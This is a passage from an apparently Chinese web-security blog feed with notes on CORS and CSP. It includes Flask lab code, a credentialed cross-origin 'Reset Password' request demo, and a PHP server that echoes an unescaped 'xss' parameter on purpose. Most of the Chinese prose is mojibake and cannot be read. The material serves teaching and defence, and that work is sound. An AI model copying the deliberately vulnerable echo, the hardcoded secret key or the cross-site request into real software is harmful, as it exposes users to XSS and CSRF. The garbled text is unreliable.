class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key=<span class="string">'random_secret_key'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/get', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">'user'</span>,<span class="string">''</span>)==<span class="string">'admin'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Admin do something!"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Privilege..."</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    user=request.args.get(<span class="string">"user"</span>, <span class="string">"Null"</span>)</span><br><span class="line">    session[<span class="string">"user"</span>]=user</span><br><span class="line">    template=<span class="string">"""</span></span><br><span class="line"><span class="string">    &lt;h3&gt; Login as &#123;&#123; user &#125;&#125;... &lt;/h3&gt;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, user=user)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">8888</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>å‘è¯·æ±‚ï¼Œå¯ä»¥çœ‹åˆ°è¯·æ±‚ç¡®å®å·²å‘é€ï¼Œå¹¶ä¸”å¯ä»¥å¸¦cookieï¼ˆwithCredentialsï¼‰ï¼Œä½†æ˜¯jsæ²¡æœ‰æ‹¿åˆ°ç»“æœï¼š</p><p>AJAXè¯·æ±‚ç»“æœï¼ˆè¯·æ±‚æˆåŠŸï¼Œå›ä¼ å¤±è´¥ï¼Œæ‰€ä»¥è¿™ä¹Ÿæ˜¯GETå‹CSRFæ— æ³•å¾ˆå¥½é˜²èŒƒçš„åŸå› ï¼‰ï¼š</p><p><img src="/HTTP-è·¨åŸŸèµ„æºå…±äº«CORSå­¦ä¹ ç¬”è®°/1548854666171.png" alt="1548854666171"></p><p>ç»¼ä¸Šï¼Œå¯¹äºç®€å•è·¨åŸŸè¯·æ±‚ï¼Œè‹¥æœªæ­£ç¡®é…ç½®åˆ™è¯·æ±‚æ­£å¸¸å‘é€ï¼Œä¸èƒ½è·å–è¿”å›ç»“æœï¼ˆæµè§ˆå™¨æ‹¦æˆªï¼‰ã€‚</p><h2 id="Originå’ŒAccess-Control-Allow-Origin"><a href="#Originå’ŒAccess-Control-Allow-Origin" class="headerlink" title="Originå’ŒAccess-Control-Allow-Origin"></a>Originå’ŒAccess-Control-Allow-Origin</h2><p>å¯ä»¥çœ‹åˆ°åœ¨è¯·æ±‚ä¸­å­˜åœ¨Originå­—æ®µï¼Œå®ƒæ ‡è®°äº†æ¥æºï¼Œå¯¹åº”çš„Access-Control-Allow-Originä¸ºå›åº”åŒ…å¤´æºå¸¦å­—æ®µï¼Œå®ƒè¡¨ç¤ºé‚£äº›æ¥æºå¯ä»¥è®¿é—®æœ¬åŸŸï¼Œ<code>*</code>è¡¨ç¤ºæ‰€æœ‰æ¥æºï¼ˆæ³¨æ„å®ƒä¸èƒ½ä¸credentialsä¸€èµ·ä½¿ç”¨ï¼‰ã€‚</p><p>ä½¿ç”¨CORSå®ç°çš„æ”¯æŒè·¨åŸŸçš„éåŒæºæœåŠ¡<a href="http://127.0.0.1:8888/ï¼š" target="_blank" rel="noopener">http://127.0.0.1:8888/ï¼š</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/get', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">'user'</span>,<span class="string">''</span>)==<span class="string">'admin'</span>:</span><br><span class="line">        ret = <span class="string">"Admin do something!"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret = <span class="string">"No Privilege..."</span></span><br><span class="line">    resp=make_response(ret)</span><br><span class="line">    resp.headers[<span class="string">'Access-Control-Allow-Origin'</span>] = <span class="string">"http://127.0.0.1:8000"</span></span><br><span class="line">    resp.headers[<span class="string">'Access-Control-Allow-Credentials'</span>] = <span class="string">'true'</span></span><br><span class="line">    resp.headers[<span class="string">'Access-Control-Allow-Methods'</span>] = <span class="string">"POST, GET, OPTIONS, PUT, DELETE, PATCH"</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure><p>å…¶ä¸­è¿˜æœ‰å‡ ä¸ªheaderï¼š</p><ul><li>Access-Control-Allow-Credentialsï¼šå¦‚æœè¯·æ±‚éœ€è¦å¸¦cookieï¼Œè¯¥headerå¿…é¡»ä¸ºtrueï¼ŒåŒæ—¶<code>Access-Control-Allow-Origin</code>ä¸èƒ½ä¸º<code>*</code>ï¼Œå¦åˆ™åŒæ ·æ‹¿ä¸åˆ°ç»“æœï¼›</li><li>Access-Control-Allow-Methodsï¼šå…è®¸çš„è¯·æ±‚æ–¹å¼</li></ul><p><code>Origin</code>å’Œ<code>Access-Control-Allow-Origin</code>ä¸€ä¸ªä¸ºè¯·æ±‚æºå¸¦çš„å­—æ®µï¼Œä¸€ä¸ªä¸ºå›åº”æºå¸¦çš„å­—æ®µï¼Œæµè§ˆå™¨ä»¥æ­¤æ¥åˆ¤æ–­jsæ˜¯å¦å¯ä»¥æ¥æ”¶å›åº”ã€‚</p><p>æ”¹é€ åå‰ç«¯ç»ˆäºèƒ½å¤Ÿæ‹¿åˆ°ç»“æœï¼š</p><p><img src="/HTTP-è·¨åŸŸèµ„æºå…±äº«CORSå­¦ä¹ ç¬”è®°/1548855646635.png" alt="1548855646635"></p><h1 id="é¢„æ£€è¯·æ±‚"><a href="#é¢„æ£€è¯·æ±‚" class="headerlink" title="é¢„æ£€è¯·æ±‚"></a>é¢„æ£€è¯·æ±‚</h1><p>è‹¥è¯·æ±‚ä¸ä¸ºç®€å•è¯·æ±‚ï¼Œé‚£ä¹ˆåœ¨å‘èµ·è¯¥è¯·æ±‚å‰å¿…é¡»ä½¿ç”¨OPTIONSå‘é€é¢„éªŒè¯·æ±‚ï¼ŒæœåŠ¡å™¨å…è®¸åæ‰èƒ½å‘é€å®é™…è¯·æ±‚ï¼ˆå¯ä»¥çŒœæƒ³è¿™æ˜¯ä¸ºäº†é˜²æ­¢CSRFï¼‰ã€‚</p><p>å½“è¯·æ±‚æ»¡è¶³ä¸€ä¸‹ä»»ä¸€æ¡ä»¶æ—¶ï¼Œè¯¥è¯·æ±‚ä¸ºéç®€å•è¯·æ±‚ï¼š</p><ul><li>ä½¿ç”¨äº†ä¸‹é¢ä»»ä¸€ HTTP æ–¹æ³•ï¼š<ul><li>PUT</li><li>DELETE</li><li>CONNECT</li><li>OPTIONS</li><li>TRACE</li><li>PATCH</li></ul></li><li>äººä¸ºè®¾ç½®äº†å¯¹ CORS å®‰å…¨çš„é¦–éƒ¨å­—æ®µé›†åˆ ä¹‹å¤–çš„å…¶ä»–é¦–éƒ¨å­—æ®µã€‚</li><li><code>Content-Type</code>çš„å€¼ä¸å±äºä¸‹åˆ—ä¹‹ä¸€:<ul><li>application/x-www-form-urlencoded</li><li>multipart/form-data</li><li>text/plain</li></ul></li><li>è¯·æ±‚ä¸­çš„<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequestUpload" target="_blank" rel="noopener"><code>XMLHttpRequestUpload</code></a> å¯¹è±¡æ³¨å†Œäº†ä»»æ„å¤šä¸ªäº‹ä»¶ç›‘å¬å™¨ã€‚</li><li>è¯·æ±‚ä¸­ä½¿ç”¨äº†<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/ReadableStream" target="_blank" rel="noopener"><code>ReadableStream</code></a>å¯¹è±¡ã€‚</li></ul><h2 id="é¢„æ£€è¯·æ±‚è·¨åŸŸè¡¨ç°"><a href="#é¢„æ£€è¯·æ±‚è·¨åŸŸè¡¨ç°" class="headerlink" title="é¢„æ£€è¯·æ±‚è·¨åŸŸè¡¨ç°"></a>é¢„æ£€è¯·æ±‚è·¨åŸŸè¡¨ç°</h2><p>å‡è®¾æœ‰æœåŠ¡å™¨<a href="http://127.0.0.1:8888/jsonï¼š" target="_blank" rel="noopener">http://127.0.0.1:8888/jsonï¼š</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/json', methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">json</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'json.html'</span>, Evil=<span class="string">"Benign"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">'user'</span>,<span class="string">''</span>)==<span class="string">'admin'</span>:</span><br><span class="line">            print(<span class="string">"session:"</span>,session)</span><br><span class="line">            data=request.json</span><br><span class="line">            ret=<span class="string">'Admin do '</span>+data[<span class="string">"action"</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret=<span class="string">"No Privilege2..."</span></span><br><span class="line">        print(ret)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">'result'</span>: ret&#125;)</span><br></pre></td></tr></table></figure><p>â€˜templates/json.htmlâ€™å†…å®¹ä¸ºï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123; Evil &#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> Reset Password <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">submitRequest</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">    xhr.open(<span class="string">"POST"</span>, <span class="string">"http://127.0.0.1:8888/json"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">    xhr.setRequestHeader(<span class="string">"Accept"</span>, <span class="string">"*/*"</span>);</span></span><br><span class="line"><span class="javascript">    xhr.setRequestHeader(<span class="string">"Accept-Language"</span>, <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span>);</span></span><br><span class="line"><span class="javascript">    xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/json; charset=utf-8"</span>);</span></span><br><span class="line"><span class="javascript">    xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">    xhr.send(<span class="built_in">JSON</span>.stringify(&#123;<span class="string">"action"</span>:<span class="string">"change passwd..."</span>&#125;));</span></span><br><span class="line"><span class="javascript">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">        if(xhr.readyState === 4 &amp;&amp; xhr.status === 200)&#123;</span><br><span class="line">            alert(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"submitRequest()"</span>&gt;</span>Conform<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åŒåŸŸä¸å­˜åœ¨é¢„æ£€è¯·æ±‚ï¼š</p><p><img src="/HTTP-è·¨åŸŸèµ„æºå…±äº«CORSå­¦ä¹ ç¬”è®°/1548918853746.png" alt="1548918853746"></p><p>è·¨åŸŸå‡ºç°OPTIONSè¯·æ±‚ï¼Œé»˜è®¤æƒ…å†µä¸‹è·¨åŸŸè¢«é˜»æ­¢ï¼š</p><p><img src="/HTTP-è·¨åŸŸèµ„æºå…±äº«CORSå­¦ä¹ ç¬”è®°/1548920449712.png" alt="1548920449712"></p><p><code>Access-Control-Request-Method:</code>å­—æ®µè¯´æ˜è¯·æ±‚çš„æ“ä½œ</p><h2 id="å…è®¸è·¨åŸŸè¯·æ±‚"><a href="#å…è®¸è·¨åŸŸè¯·æ±‚" class="headerlink" title="å…è®¸è·¨åŸŸè¯·æ±‚"></a>å…è®¸è·¨åŸŸè¯·æ±‚</h2><p>åœ¨OPTIONSå’ŒPOSTæŠ¥å¤´åŠ å…¥<code>Access-Control-Allow-Origin</code>ç­‰å­—æ®µ<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/json', methods=['GET','POST','OPTIONS'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">json</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'json.html'</span>, Evil=<span class="string">"Benign"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">'user'</span>,<span class="string">''</span>)==<span class="string">'admin'</span>:</span><br><span class="line">            print(<span class="string">"session:"</span>,session)</span><br><span class="line">            data=request.json</span><br><span class="line">            ret=<span class="string">'Admin do '</span>+data[<span class="string">"action"</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret=<span class="string">"No Privilege2..."</span></span><br><span class="line">        resp=make_response(jsonify(&#123;<span class="string">'result'</span>: ret&#125;))</span><br><span class="line">        resp.headers[<span class="string">'Access-Control-Allow-Origin'</span>] = <span class="string">"http://127.0.0.1:8000"</span></span><br><span class="line">        resp.headers[<span class="string">'Access-Control-Allow-Credentials'</span>] = <span class="string">'true'</span></span><br><span class="line">        resp.headers[<span class="string">'Access-Control-Allow-Methods'</span>] = <span class="string">"POST, GET, OPTIONS, PUT, DELETE, PATCH"</span></span><br><span class="line">        resp.headers[<span class="string">'Access-Control-Allow-Headers'</span>] = <span class="string">"origin, content-type, accept, x-requested-with"</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure></p><p>è·¨ç«™æˆåŠŸï¼Œå…ˆå‘é€OPTIONSï¼Œå†å‘é€POSTï¼Œæ³¨æ„è¿™ä¸¤ä¸ªæŠ¥å¤´å¿…é¡»éƒ½å­˜åœ¨CORSå­—æ®µã€‚</p><p><img src="/HTTP-è·¨åŸŸèµ„æºå…±äº«CORSå­¦ä¹ ç¬”è®°/1548922726229.png" alt="1548922726229"></p><h1 id="ä¸CORSæœ‰å…³çš„HTTPå¤´"><a href="#ä¸CORSæœ‰å…³çš„HTTPå¤´" class="headerlink" title="ä¸CORSæœ‰å…³çš„HTTPå¤´"></a>ä¸CORSæœ‰å…³çš„HTTPå¤´</h1><h2 id="è¯·æ±‚"><a href="#è¯·æ±‚" class="headerlink" title="è¯·æ±‚"></a>è¯·æ±‚</h2><ul><li><code>Originï¼š&lt;origin&gt;</code>ï¼šè¡¨ç¤ºå®é™…è¯·æ±‚çš„æºç«™</li><li><code>Access-Control-Request-Method: &lt;method&gt;</code>ï¼šç”¨äºé¢„æ£€è¯·æ±‚ï¼Œè¡¨ç¤ºçœŸå®çš„è¯·æ±‚æ–¹æ³•ã€‚</li><li><code>Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</code>ï¼šç”¨äºé¢„æ£€è¯·æ±‚ï¼Œè¡¨ç¤ºçœŸå®è¯·æ±‚æ‰€æºå¸¦çš„é¦–éƒ¨å­—æ®µï¼ˆä»æŠ“åŒ…ä¸Šæ¥çœ‹chromeæ²¡æœ‰æŒ‰è¦æ±‚æ¥å•ŠOrzï¼‰</li></ul><h2 id="å“åº”"><a href="#å“åº”" class="headerlink" title="å“åº”"></a>å“åº”</h2><ul><li><code>Access-Control-Allow-Origin: &lt;origin&gt; | *</code>ï¼šå…è®¸å¤–åŸŸURI</li><li><code>Access-Control-Allow-Credentialsï¼šfalse</code>ï¼šæ˜¯å¦å…è®¸æµè§ˆå™¨è¯»å–responseå†…å®¹ï¼ˆå¦‚cookieï¼‰</li><li><code>Access-Control-Allow-Methods</code>ï¼šç”¨äºé¢„æ£€è¯·æ±‚å“åº”ï¼Œè¡¨ç¤ºå…è®¸ä½¿ç”¨çš„HTTPæ–¹æ³•</li><li><code>Access-Control-Allow-Headers</code>ï¼šç”¨äºé¢„æ£€è¯·æ±‚å“åº”ï¼Œè¡¨ç¤ºå…è®¸æºå¸¦çš„å¤´éƒ¨</li><li><code>Access-Control-Expose-Headers</code>ï¼šå…è®¸å“åº”æ—¶èƒ½è·å–çš„å…¶ä»–å¤´éƒ¨ï¼ˆåœ¨è·¨åŸŸè®¿é—®æ—¶ï¼ŒXMLHttpRequestå¯¹è±¡çš„getResponseHeader()æ–¹æ³•åªèƒ½æ‹¿åˆ°ä¸€äº›æœ€åŸºæœ¬çš„å“åº”å¤´ï¼‰</li><li><code>Access-Control-Max-Age</code>ï¼špreflightè¯·æ±‚çš„æœ€å¤§å“åº”æ—¶é—´</li></ul><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul><li>Cross-Origin Resource Sharingï¼ˆCORSï¼‰è¯¦è§£ï¼ŒCORSè¯¦è§£ï¼ŒCORSåŸç†åˆ†æï¼Œ<a href="https://www.cnblogs.com/demingblog/p/8393511.html" target="_blank" rel="noopener">https://www.cnblogs.com/demingblog/p/8393511.html</a></li><li>HTTPè®¿é—®æ§åˆ¶ï¼ˆCORSï¼‰ï¼Œ<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨-HTTP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CORS </tag>
            
            <tag> è·¨åŸŸï¼ŒHTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…å®¹å®‰å…¨ç­–ç•¥CSPå­¦ä¹ ç¬”è®°</title>
      <link href="/HTTP-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5CSP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/HTTP-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5CSP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>å†…å®¹å®‰å…¨ç­–ç•¥   (CSP) æ˜¯ä¸€ä¸ªé¢å¤–çš„å®‰å…¨å±‚ï¼Œç”¨äºå…è®¸ç«™ç‚¹çš„ç®¡ç†è€…æ§åˆ¶é¡µé¢ä¸Šå“ªäº›èµ„æºèƒ½å¤Ÿè¢«ç”¨æˆ·ä»£ç†ç¨‹åºåŠ è½½ã€‚ä»¥é˜»æ­¢åŒ…æ‹¬è·¨ç«™è„šæœ¬ (XSS) ã€æ•°æ®æ³¨å…¥ç­‰æ”»å‡»ã€‚</p><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><h2 id="åœ¨HTTPå¤´éƒ¨æŒ‡å®šç­–ç•¥"><a href="#åœ¨HTTPå¤´éƒ¨æŒ‡å®šç­–ç•¥" class="headerlink" title="åœ¨HTTPå¤´éƒ¨æŒ‡å®šç­–ç•¥"></a>åœ¨HTTPå¤´éƒ¨æŒ‡å®šç­–ç•¥</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: policy</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨metaæ ‡ç­¾æŒ‡å®šç­–ç•¥"><a href="#ä½¿ç”¨metaæ ‡ç­¾æŒ‡å®šç­–ç•¥" class="headerlink" title="ä½¿ç”¨metaæ ‡ç­¾æŒ‡å®šç­–ç•¥"></a>ä½¿ç”¨metaæ ‡ç­¾æŒ‡å®šç­–ç•¥</h2><a id="more"></a><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-security-policy"</span> <span class="attr">content</span>=<span class="string">"policy"</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h1><h2 id="å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨"><a href="#å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨" class="headerlink" title="å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨"></a>å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨</h2><p>å†™ä¸€ä¸ªåå°„å¼çš„XSSæœåŠ¡å§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo $_GET[&apos;xss&apos;];?&gt;</span><br><span class="line">&lt;script src=&quot;/js/benign.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>bengin.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="string">"I'm benign~~~"</span>);</span><br></pre></td></tr></table></figure><p>evil.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="string">"I'm evil!"</span>);</span><br></pre></td></tr></table></figure><p>æ¯«æ— ç–‘é—®å®ƒæ˜¯å­˜åœ¨æ¼æ´çš„ï¼Œä¸è¿‡æ— å¥ˆç°åœ¨chromeçš„åå°„å‹xssé˜²å¾¡åšçš„å¤ªå¥½äº†ï¼Œæˆ‘ä»¬åªèƒ½å…ˆæš‚æ—¶å…³é—­å®ƒ(jåŠ header)æ¥é™ä½å®éªŒéš¾åº¦ï¼Œåœ¨BPé‡Œé¢åŠ ä¸€ä¸ªâ€X-XSS-Protection:0â€çš„Headerï¼š</p><p><img src="/HTTP-å†…å®¹å®‰å…¨ç­–ç•¥CSPå­¦ä¹ ç¬”è®°/1548835133910.png" alt="1548835133910"></p><p>æˆ‘åœ¨8000ç«¯å£åˆèµ·äº†ä¸€ä¸ªhttpæœåŠ¡ï¼Œæ¥ç€éšå¿ƒæ‰€æ¬²çš„XSSï¼š</p><p><img src="/HTTP-å†…å®¹å®‰å…¨ç­–ç•¥CSPå­¦ä¹ ç¬”è®°/1548835338494.png" alt="1548835338494"></p><h2 id="åº”ç”¨é»˜è®¤ç­–ç•¥"><a href="#åº”ç”¨é»˜è®¤ç­–ç•¥" class="headerlink" title="åº”ç”¨é»˜è®¤ç­–ç•¥"></a>åº”ç”¨é»˜è®¤ç­–ç•¥</h2><p>é…ç½®è¯¥ç«™ç‚¹çš„å†…å®¹å‡æ¥è‡ªåŒæºï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>default-src</code>æ˜¯æŒ‡è‹¥å…¶ä»–å…ƒç´ æ¥æºçš„è§„åˆ™ï¼ˆå¦‚<code>script-src</code>ï¼Œ<code>img-src</code>ï¼‰æ²¡æœ‰è®¾ç½®çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤ä½¿ç”¨<code>default-src</code>çš„é…ç½®ï¼Œ<code>self</code>æ˜¯åŒæºã€‚</p><p>è®¾ç½®åå¯ä»¥çœ‹åˆ°xssè¢«æ‹¦æˆªï¼Œä»¥ä¸ºæ¶æ„è„šæœ¬æ¥è‡ªä¸åŒçš„æºï¼š</p><p><img src="/HTTP-å†…å®¹å®‰å…¨ç­–ç•¥CSPå­¦ä¹ ç¬”è®°/1548835861387.png" alt="1548835861387"></p><h2 id="ä¿¡ä»»å¤šä¸ªåŸŸå"><a href="#ä¿¡ä»»å¤šä¸ªåŸŸå" class="headerlink" title="ä¿¡ä»»å¤šä¸ªåŸŸå"></a>ä¿¡ä»»å¤šä¸ªåŸŸå</h2><p>å…ƒç´ çš„å¯ä¿¡æ¥æºå¯ä»¥æœ‰å¤šä¸ªï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self' *.trusted.com</span><br></pre></td></tr></table></figure><h2 id="æ¥æºé…ç½®"><a href="#æ¥æºé…ç½®" class="headerlink" title="æ¥æºé…ç½®"></a>æ¥æºé…ç½®</h2><ul><li><code>*</code>ï¼š å…è®¸æ‰€æœ‰</li><li><code>none</code>ï¼šç¦æ­¢åŠ è½½ä»»ä½•è·¯å¾„çš„èµ„æº</li><li><code>self</code>ï¼šå…è®¸åŠ è½½åŒæºçš„èµ„æº</li><li><code>data:</code>ï¼šå…è®¸é€šè¿‡æ•°æ®æ¨¡å¼åŠ è½½èµ„æº</li><li><code>domain.ccc.com</code>ï¼šå…è®¸åŠ è½½åŒ¹é…åŸŸåçš„èµ„æº</li><li><code>*.ccc.com</code>ï¼šå…è®¸åŠ è½½åŒ¹é…åŸŸåçš„èµ„æº</li><li><code>https://img.ccc.com</code>ï¼šå…è®¸åŠ è½½httpsæ–¹å¼çš„åŸŸåèµ„æº</li><li><code>unsafe-inline</code>ï¼šå…è®¸ä½¿ç”¨å†…è”å…ƒç´ </li><li><code>unsafe-eval</code>ï¼šå…è®¸æ‰§è¡Œevalå‡½æ•°</li></ul><h2 id="ç²¾ç¡®æ§åˆ¶"><a href="#ç²¾ç¡®æ§åˆ¶" class="headerlink" title="ç²¾ç¡®æ§åˆ¶"></a>ç²¾ç¡®æ§åˆ¶</h2><p>å…¶ä»–å¯ä»¥è®¾ç½®çš„æºæœ‰ï¼š</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/child-src" target="_blank" rel="noopener"><code>child-src</code></a></li><li><a 